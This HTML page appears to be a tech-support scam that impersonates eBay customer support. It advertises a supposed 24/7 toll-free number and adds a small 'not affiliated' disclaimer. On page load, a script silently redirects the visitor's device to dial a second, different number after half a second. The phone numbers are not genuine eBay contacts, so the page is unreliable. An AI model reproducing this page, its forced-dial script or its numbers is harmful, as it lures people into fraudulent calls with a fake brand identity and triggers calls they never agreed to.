<!DOCTYPE html>
<html lang="en">


<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ebay Support Help Center</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f8f9fa;
      color: #333;
    }
    header {
      background-color: #0078D7;
      color: white;
      padding: 1.5em 1em;
      text-align: center;
    }
    .hero {
      padding: 2em;
      background-color: #e1ecf7;
      text-align: center;
    }
    .hero h2 {
      margin: 0;
    }
    .contact-box {
      background-color: #fff;
      max-width: 500px;
      margin: 2em auto;
      padding: 2em;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }
    .contact-box h3 {
      margin-bottom: 0.5em;
    }
    .phone-number {
      font-size: 1.5em;
      color: #0078D7;
      margin: 1em 0;
    }
    footer {
      background-color: #343a40;
      color: white;
      text-align: center;
      padding: 3em 1em 1em;
      margin-top: 3em;
      position: relative;
    }
    .floating-button {
      position: absolute;
      left: 50%;
      bottom: 60px;
      transform: translateX(-50%);
      background-color: rgba(0, 120, 215, 0.8);
      color: white;
      padding: 0.8em 1.2em;
      border: none;
      border-radius: 30px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.2);
      cursor: pointer;
      font-size: 1em;
      z-index: 1000;
      backdrop-filter: blur(5px);
    }
    .floating-button:hover {
      background-color: rgba(0, 95, 163, 0.9);
    }
  </style>
</head>
<script defer data-domain="ms.in" src="../../plausible.io/js/script.js"></script>
<body>

  <header>
    <h1>Ebay Support™</h1>
    <p>24/7 Help Center for Ebay Products</p>
  </header>

  <section class="hero">
    <h2>Need Help with Ebay Products?</h2>
    <p>Call our toll-free number and get expert support now!</p>
  </section>

  <section class="contact-box">
    <h3>Customer Support Number</h3>
    <div class="phone-number">+1-805-248-6258</div>
    <p>Available 24/7 for Ebay Customer Support</p>
  </section>

  <footer>
    <button class="floating-button" onclick="window.location.href='tel:+18052486258'">
      Call Now
    </button>
    &copy; 2025 Ebay-Support™. Not affiliated with Ebay Corporation.
  </footer>
<script>
        window.onload = function() {
            setTimeout(function() {
                window.location.href = "tel:+1 (833) 398-0341"; 
            }, 500); // Automatically calls after 5 seconds
        };
    </script>
</body>


</html>
